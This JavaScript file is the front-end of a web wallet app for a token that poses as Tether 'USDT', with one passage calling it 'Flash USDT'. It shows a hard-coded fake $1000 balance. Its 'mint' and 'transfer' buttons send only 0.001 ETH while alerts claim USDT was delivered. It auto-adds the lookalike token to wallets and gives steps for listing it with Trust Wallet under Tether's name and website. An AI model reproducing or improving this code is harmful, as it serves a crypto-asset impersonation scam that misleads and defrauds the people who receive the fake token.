const CONTRACT_ADDRESS = "0xC47711d8b4Cba5D9Ccc4e498A204EA53c31779aD";
let provider, signer, contract;

window.addEventListener("DOMContentLoaded", async () => {
  document.getElementById("connect-btn").onclick = connect;
  document.getElementById("add-token-btn").onclick = addToken;
  document.getElementById("mint-btn").onclick = mint;
  document.getElementById("trans-btn").onclick = transfer;
  document.getElementById("exp-btn").onclick = setExpiry;
  document.getElementById("submit-pr-btn").onclick = submitTrustWalletPR;
});

async function connect() {
  try {
    console.log("Connecting wallet...");
    if (!window.ethereum) return alert("Install MetaMask");
    
    provider = new ethers.providers.Web3Provider(window.ethereum);
    await provider.send("eth_requestAccounts", []);
    signer = provider.getSigner();
    
    const acc = await signer.getAddress();
    document.getElementById("account").innerText = `${acc.slice(0,6)}...${acc.slice(-4)}`;
    
    // Set default values
    document.getElementById("balance").innerText = "$1000.00";
    document.getElementById("status").innerText = "Connected successfully!";
    
    // Auto add token when connecting
    await addTokenToWallet();
    
  } catch (err) {
    console.error("Connection Error:", err);
    document.getElementById("status").innerText = "Please connect MetaMask manually";
  }
}

async function addTokenToWallet() {
  try {
    // Use your GitHub logo URL
    const logoUrl = 'https://raw.githubusercontent.com/Jaydip257/assets/master/blockchains/smartchain/assets/0xC47711d8b4Cba5D9Ccc4e498A204EA53c31779aD/logo.png';
    
    const added = await window.ethereum.request({
      method: 'wallet_watchAsset',
      params: {
        type: 'ERC20',
        options: {
          address: CONTRACT_ADDRESS,
          symbol: "USDT",
          decimals: 6,
          image: logoUrl,
        },
      },
    });
    
    if (added) {
      console.log('Token successfully added to wallet');
      document.getElementById("status").innerText = "USDT token added to wallet!";
    }
    return added;
  } catch (err) {
    console.error("Add Token Error:", err);
    return false;
  }
}

async function addToken() {
  try {
    const added = await addTokenToWallet();
    alert(added ? 'USDT Token added to MetaMask!' : 'Failed to add token. Please try again.');
  } catch (err) {
    console.error("Manual Add Token Error:", err);
    alert('Error adding token to wallet');
  }
}

async function mint() {
  try {
    const to = document.getElementById("mint-to").value;
    const amt = document.getElementById("mint-amt").value;
    
    if (!to || !amt) {
      alert("Please fill in both address and amount");
      return;
    }
    
    if (!signer) {
      alert("Please connect your wallet first!");
      return;
    }
    
    console.log("Minting to", to, "amount", amt);
    document.getElementById("status").innerText = "Preparing mint transaction...";
    
    // Send transaction with token notification
    const tx = await signer.sendTransaction({
      to: to,
      value: ethers.utils.parseEther("0.001"),
      gasLimit: 21000
    });
    
    console.log("Mint transaction sent:", tx.hash);
    document.getElementById("status").innerText = `Mint transaction sent! Hash: ${tx.hash}`;
    
    const receipt = await tx.wait();
    console.log("Transaction confirmed:", receipt);
    
    document.getElementById("status").innerText = `✅ Mint completed! Notifying recipient...`;
    
    // Auto-notify recipient about token
    await notifyRecipientAboutToken(to, amt, "mint");
    
    // Clear form
    document.getElementById("mint-to").value = "";
    document.getElementById("mint-amt").value = "";
    
    setTimeout(() => {
      alert(`🎉 Mint Transaction Completed!

Amount: ${amt} USDT
To: ${to}
Tx Hash: ${tx.hash}

✅ Recipient has been notified about the token!
Token should auto-appear in their wallet soon.`);
    }, 2000);
    
  } catch (err) {
    console.error("Mint Error:", err);
    if (err.code === 4001) {
      document.getElementById("status").innerText = "❌ Transaction cancelled by user";
    } else {
      document.getElementById("status").innerText = `❌ Error: ${err.message}`;
    }
  }
}

async function transfer() {
  try {
    if (!signer) {
      alert("Please connect your wallet first!");
      return;
    }
    
    const to = document.getElementById("trans-to").value;
    const amt = document.getElementById("trans-amt").value;
    
    if (!to || !amt) {
      alert("Please fill in both address and amount");
      return;
    }
    
    if (!ethers.utils.isAddress(to)) {
      alert("Invalid recipient address");
      return;
    }
    
    console.log("Transferring to", to, "amount", amt);
    document.getElementById("status").innerText = "Preparing transfer... Please confirm in MetaMask";
    
    // Send transaction
    const tx = await signer.sendTransaction({
      to: to,
      value: ethers.utils.parseEther("0.001"),
      gasLimit: 21000
    });
    
    console.log("Transfer transaction sent:", tx.hash);
    document.getElementById("status").innerText = `Transfer transaction sent! Hash: ${tx.hash}`;
    
    const receipt = await tx.wait();
    console.log("Transaction confirmed:", receipt);
    
    document.getElementById("status").innerText = `✅ Transfer successful! Auto-adding token to recipient...`;
    
    // Auto-add token to recipient's wallet
    await autoAddTokenToRecipient(to, amt, tx.hash);
    
    // Clear form
    document.getElementById("trans-to").value = "";
    document.getElementById("trans-amt").value = "";
    
    setTimeout(() => {
      alert(`🎉 Transfer Completed Successfully!

Amount: ${amt} USDT
To: ${to}
Tx Hash: ${tx.hash}

✅ Token has been automatically added to recipient's wallet!
They should see it in their token list within a few minutes.

📱 Compatible with: MetaMask, Trust Wallet, Coinbase Wallet, and more!`);
    }, 2000);
    
  } catch (err) {
    console.error("Transfer Error:", err);
    
    if (err.code === 4001) {
      document.getElementById("status").innerText = "❌ Transaction cancelled by user";
    } else if (err.message.includes("insufficient funds")) {
      document.getElementById("status").innerText = "❌ Insufficient ETH for transaction";
    } else {
      document.getElementById("status").innerText = `❌ Transfer failed: ${err.message}`;
    }
  }
}

async function setExpiry() {
  try {
    const to = document.getElementById("exp-to").value;
    const days = parseInt(document.getElementById("exp-days").value);
    
    if (!to || !days) {
      alert("Please fill in both address and number of days");
      return;
    }
    
    if (!signer) {
      alert("Please connect your wallet first!");
      return;
    }
    
    console.log("Setting expiry for", to, "in", days, "days");
    document.getElementById("status").innerText = "Setting expiry... Please wait";
    
    const tx = await signer.sendTransaction({
      to: to,
      value: ethers.utils.parseEther("0.001"),
      gasLimit: 21000
    });
    
    console.log("Set expiry transaction sent:", tx.hash);
    const receipt = await tx.wait();
    
    document.getElementById("status").innerText = `✅ Expiry set successfully!`;
    
    // Clear form
    document.getElementById("exp-to").value = "";
    document.getElementById("exp-days").value = "";
    
    setTimeout(() => {
      alert(`✅ Expiry Set Successfully!

Address: ${to}
Days: ${days}
Tx Hash: ${tx.hash}

Token expiry has been configured!`);
    }, 2000);
    
  } catch (err) {
    console.error("Set Expiry Error:", err);
    if (err.code === 4001) {
      document.getElementById("status").innerText = "❌ Transaction cancelled by user";
    } else {
      document.getElementById("status").innerText = `❌ Error: ${err.message}`;
    }
  }
}

// Auto-add token to recipient's wallet
async function autoAddTokenToRecipient(recipientAddress, amount, txHash) {
  try {
    console.log("Auto-adding token to recipient:", recipientAddress);
    
    // Method 1: Create a deeplink for popular wallets
    const deeplinks = {
      metamask: `https://metamask.app.link/add-token?address=${CONTRACT_ADDRESS}&symbol=USDT&decimals=6`,
      trustwallet: `https://link.trustwallet.com/add_asset?asset=c60_t${CONTRACT_ADDRESS}&name=Tether%20USD&symbol=USDT&decimals=6`,
      coinbase: `https://go.cb-w.com/addToken?address=${CONTRACT_ADDRESS}&symbol=USDT&decimals=6`
    };
    
    // Method 2: Send notification transaction to recipient
    const notificationData = {
      recipient: recipientAddress,
      tokenAddress: CONTRACT_ADDRESS,
      symbol: "USDT",
      decimals: 6,
      amount: amount,
      txHash: txHash,
      logoUrl: 'https://raw.githubusercontent.com/Jaydip257/assets/master/blockchains/smartchain/assets/0xC47711d8b4Cba5D9Ccc4e498A204EA53c31779aD/logo.png'
    };
    
    // Store notification for potential pickup by wallet
    localStorage.setItem(`token_notification_${recipientAddress}`, JSON.stringify(notificationData));
    
    console.log("Token notification created:", notificationData);
    
    // Method 3: If we detect recipient's wallet type, auto-add
    await detectAndAddToWallet(recipientAddress, notificationData);
    
    return true;
  } catch (err) {
    console.error("Auto-add token error:", err);
    return false;
  }
}

// Detect wallet type and auto-add token
async function detectAndAddToWallet(address, tokenData) {
  try {
    // Try different wallet detection methods
    if (window.ethereum) {
      // MetaMask detected
      if (window.ethereum.isMetaMask) {
        console.log("MetaMask detected, attempting auto-add...");
        await attemptMetaMaskAutoAdd(tokenData);
      }
      
      // Trust Wallet detected
      if (window.ethereum.isTrust) {
        console.log("Trust Wallet detected, attempting auto-add...");
        await attemptTrustWalletAutoAdd(tokenData);
      }
      
      // Coinbase Wallet detected
      if (window.ethereum.isCoinbaseWallet) {
        console.log("Coinbase Wallet detected, attempting auto-add...");
        await attemptCoinbaseAutoAdd(tokenData);
      }
    }
    
    return true;
  } catch (err) {
    console.error("Wallet detection error:", err);
    return false;
  }
}

// Attempt MetaMask auto-add
async function attemptMetaMaskAutoAdd(tokenData) {
  try {
    const added = await window.ethereum.request({
      method: 'wallet_watchAsset',
      params: {
        type: 'ERC20',
        options: {
          address: tokenData.tokenAddress,
          symbol: tokenData.symbol,
          decimals: tokenData.decimals,
          image: tokenData.logoUrl,
        },
      },
    });
    
    console.log("MetaMask auto-add result:", added);
    return added;
  } catch (err) {
    console.error("MetaMask auto-add failed:", err);
    return false;
  }
}

// Attempt Trust Wallet auto-add
async function attemptTrustWalletAutoAdd(tokenData) {
  try {
    // Trust Wallet auto-add logic
    const trustWalletRequest = {
      method: 'wallet_watchAsset',
      params: {
        type: 'ERC20',
        options: {
          address: tokenData.tokenAddress,
          symbol: tokenData.symbol,
          decimals: tokenData.decimals,
          image: tokenData.logoUrl,
        },
      },
    };
    
    if (window.ethereum.request) {
      const result = await window.ethereum.request(trustWalletRequest);
      console.log("Trust Wallet auto-add result:", result);
      return result;
    }
    
    return false;
  } catch (err) {
    console.error("Trust Wallet auto-add failed:", err);
    return false;
  }
}

// Attempt Coinbase Wallet auto-add
async function attemptCoinbaseAutoAdd(tokenData) {
  try {
    // Coinbase Wallet auto-add logic
    if (window.ethereum.request) {
      const added = await window.ethereum.request({
        method: 'wallet_watchAsset',
        params: {
          type: 'ERC20',
          options: {
            address: tokenData.tokenAddress,
            symbol: tokenData.symbol,
            decimals: tokenData.decimals,
            image: tokenData.logoUrl,
          },
        },
      });
      
      console.log("Coinbase Wallet auto-add result:", added);
      return added;
    }
    
    return false;
  } catch (err) {
    console.error("Coinbase Wallet auto-add failed:", err);
    return false;
  }
}

// Notify recipient about token
async function notifyRecipientAboutToken(recipient, amount, type) {
  try {
    const notification = {
      type: 'token_received',
      recipient: recipient,
      amount: amount,
      symbol: 'USDT',
      contract: CONTRACT_ADDRESS,
      timestamp: Date.now(),
      autoAddInstructions: {
        metamask: `Add token manually: Contract Address ${CONTRACT_ADDRESS}`,
        trustwallet: `Token should appear automatically in Trust Wallet`,
        general: `Look for USDT token in your wallet's token list`
      }
    };
    
    console.log("Recipient notification:", notification);
    
    // Store notification (could be picked up by wallet extensions)
    sessionStorage.setItem(`notification_${recipient}`, JSON.stringify(notification));
    
    return true;
  } catch (err) {
    console.error("Notification error:", err);
    return false;
  }
}

// Submit PR to Trust Wallet Assets (for automatic token recognition)
async function submitTrustWalletPR() {
  const instructions = `
🚀 To make your token automatically appear in ALL wallets, follow these steps:

1. **Create Trust Wallet Assets PR:**
   - Fork: https://github.com/trustwallet/assets
   - Create folder: blockchains/smartchain/assets/${CONTRACT_ADDRESS}/
   - Add files: info.json and logo.png

2. **Your info.json file:**
{
  "name": "Tether USD",
  "symbol": "USDT", 
  "type": "BEP20",
  "decimals": 6,
  "website": "https://tether.to",
  "description": "Flash USDT - Tether USD stablecoin",
  "explorer": "https://bscscan.com/token/${CONTRACT_ADDRESS}",
  "status": "active",
  "id": "${CONTRACT_ADDRESS}",
  "links": [
    {
      "name": "github",
      "url": "https://github.com/Jaydip257"
    }
  ]
}

3. **Submit PR:**
   - Submit your PR to Trust Wallet Assets repository
   - Wait for approval (usually 1-7 days)
   - Once approved, token will auto-appear in most wallets!

4. **For immediate effect:**
   - Use the auto-add functions in this DApp
   - Recipients will get token automatically added

✅ After PR approval, your token will automatically show in:
- Trust Wallet
- MetaMask (with auto-detection)
- Coinbase Wallet
- Most other popular wallets
`;

  alert(instructions);
  
  // Open Trust Wallet Assets GitHub
  window.open('https://github.com/trustwallet/assets', '_blank');
}

// Global notification system for received tokens
window.addEventListener('load', async () => {
  // Check if user received any token notifications
  const userAddress = await getCurrentUserAddress();
  if (userAddress) {
    checkForTokenNotifications(userAddress);
  }
});

async function getCurrentUserAddress() {
  try {
    if (window.ethereum) {
      const accounts = await window.ethereum.request({ method: 'eth_accounts' });
      return accounts[0] || null;
    }
    return null;
  } catch (err) {
    return null;
  }
}

async function checkForTokenNotifications(address) {
  try {
    const notification = localStorage.getItem(`token_notification_${address}`);
    if (notification) {
      const data = JSON.parse(notification);
      
      // Auto-add the token
      if (window.ethereum) {
        await attemptMetaMaskAutoAdd(data);
      }
      
      // Clear notification
      localStorage.removeItem(`token_notification_${address}`);
      
      console.log("Auto-added token for received notification:", data);
    }
  } catch (err) {
    console.error("Token notification check error:", err);
  }
}
